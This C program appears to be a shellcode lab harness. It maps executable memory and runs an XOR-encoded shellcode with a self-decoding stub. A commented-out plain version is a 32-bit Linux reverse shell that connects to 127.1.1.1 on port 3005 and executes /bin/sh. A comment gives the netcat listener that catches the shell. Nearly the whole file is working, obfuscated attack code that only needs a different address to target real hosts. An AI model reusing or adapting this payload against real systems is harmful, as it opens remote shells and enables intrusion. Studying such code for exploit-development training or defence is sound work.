#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Executer : gcc -m32 simple-injection-shellcode.c -o simple-injection-shellcode && ./simple-injection-shellcode
// nc -l -p 3005 -s 127.1.1.1

void main() {
    char shellcode[] = "\xeb\x1a\x5e\x31\xc9\x80\xc1\x02\x31\xd2\x8a\x54\x0e\xfe\x30\x54\x0e\xff\x80\xc1\x01\x80\xf9\x48\x75\xee\xeb\x05\xe8\xe1\xff\xff\xff\x68\x17\x7e\x00\x00\x67\x0e\x63\xb6\x94\xe9\xa6\xde\xdf\x66\x30\xe3\x5b\x58\x90\xc8\x42\x88\x25\x35\x9e\x4d\x09\x4a\xa5\xde\xd2\x6b\x88\x68\x53\xa2\xdd\x4d\xd0\x38\x06\x41\x5c\x1b\x00\x47\x00\x4d\x0b\x6d\x07\x8a\x48\x71\x8f\x76\x84\x4d\xf5\x8c\x70\x41\x7a\xb9\x99\x1b\x6a\x2e\x4d";
    // char shellcode[] = "\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x29\xc0\x66\xb8\x67\x01\x31\xd2\x89\xd1\x41\x89\xcb\x43\x66\x53\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\xb2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xc1\xb0\x3f\x49\xcd\x80\x75\xf9\x89\xc8\xb2\x0b\x92\x89\xe3\xcd\x80";
    printf("[+] shellcode length: %u\n", strlen(shellcode));

    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
